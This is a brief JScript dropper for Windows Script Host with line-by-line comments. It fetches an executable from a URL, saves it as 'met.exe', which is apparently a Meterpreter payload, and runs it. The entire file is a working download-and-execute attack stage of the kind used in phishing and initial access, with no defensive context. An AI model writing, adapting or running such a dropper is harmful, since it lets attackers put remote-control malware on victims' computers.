var url = "<URL>" //Define our URL.
var Object = WScript.CreateObject('MSXML2.XMLHTTP'); //Instantiate a downloader object.
//Object.setProxy(proxySetting, varProxyServer, varBypassList);
Object.Open('GET', url, false);
Object.Send(); //Craft and execute the request.

if (Object.Status == 200) {//Check status of the response.
    var Stream = WScript.CreateObject('ADODB.Stream');//Instantiate Stream object.

    Stream.Open();//Open the stream object to edit it.
    Stream.Type = 1;//We define the edition with binary content.
    Stream.Write(Object.ResponseBody);//Copy to the stream the body of the HTML response.
    Stream.Position = 0;//Set the stream to point to the top of the content.

    Stream.SaveToFile("met.exe", 2);//Save the content to a file and close the stream.
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe"); //Execute the file.